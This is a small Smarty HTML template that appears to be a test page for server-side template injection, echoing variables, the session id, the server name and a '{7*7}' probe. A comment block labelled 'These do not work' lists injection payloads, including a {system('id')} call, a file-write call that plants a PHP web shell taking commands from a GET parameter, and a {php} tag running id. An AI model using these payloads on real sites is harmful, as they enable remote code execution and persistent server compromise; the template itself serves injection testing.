<html>
  <head>
    <title>Smarty</title>
  </head>
  <body>
    <p>Hello, {$name}!</p>
    <p>Injected, {$inject}!</p>
    <p>session id, {$smarty.session.id}</p>
	version: {$smarty.version}<br>
	{$variable|escape:"html"}
	page from get array: {$smarty.get.page}<br>
	page from assign: {$page}<br>
Server name: {$smarty.server.SERVER_NAME}<br>
Maths: {7*7}<br>

{*
# These do not work

RCE: {system('id')}<br>
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{php}echo `id`;{/php}<br>
*}

<p>
<a href="https://www.smarty.net/docs/en/language.function.include.tpl">Include files</a>
</p>
  </body>
</html>
